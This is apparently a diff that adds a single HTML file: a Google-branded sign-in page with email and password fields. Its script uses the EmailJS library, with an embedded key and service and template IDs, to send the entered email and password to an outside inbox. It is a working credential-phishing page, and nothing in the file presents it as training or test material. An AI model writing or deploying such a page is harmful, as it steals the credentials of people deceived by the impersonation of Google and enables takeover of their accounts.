@@ -1,0 +1,107 @@
+"<!DOCTYPE html>
+<html>
+  <head>
+    <title>Login Google Style</title>
+    <style>
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #f2f2f2;
+        font-family: 'Roboto', sans-serif;
+        margin: 0;
+      }
+      .login-container {
+        background-color: white;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        width: 400px;
+        padding: 20px;
+        text-align: center;
+      }
+      .login-container img {
+        width: 75px;
+        margin-bottom: 15px;
+      }
+      .login-container h2 {
+        margin-bottom: 10px;
+        font-size: 24px;
+        color: #202124;
+      }
+      .input-group {
+        display: flex;
+        flex-direction: column;
+        margin-bottom: 15px;
+        text-align: left;
+      }
+      .input-group label {
+        margin-bottom: 5px;
+        font-size: 14px;
+        color: #5f6368;
+      }
+      .input-group input {
+        height: 40px;
+        border-radius: 4px;
+        border: 1px solid #dadce0;
+        padding: 0 10px;
+        font-size: 16px;
+      }
+      button {
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        height: 40px;
+        width: 100%;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+      button:hover {
+        background-color: #1669c1;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Google Logo">
+      <h2>Login to your account</h2>
+      <form id="login-form">
+        <div class="input-group">
+          <label for="email">Email</label>
+          <input type="email" id="email" required />
+        </div>
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" required />
+        </div>
+        <button type="submit">Send to Email</button>
+      </form>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script>
+      (function () {
+        emailjs.init('Hsw0ESPlXrmGjVXis');
+      })();
+
+      document.getElementById('login-form').addEventListener('submit', function (event) {
+        event.preventDefault();
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        emailjs.send('service_g6dtwm7', 'template_gf6g1ft', {
+          email: email,
+          password: password,
+        })
+        .then(function () {
+          alert('Email sent successfully!');
+        }, function (error) {
+          alert('Failed to send email. Error: ' + error.text);
+        });
+      });
+    </script>
+  </body>
+</html>
+"
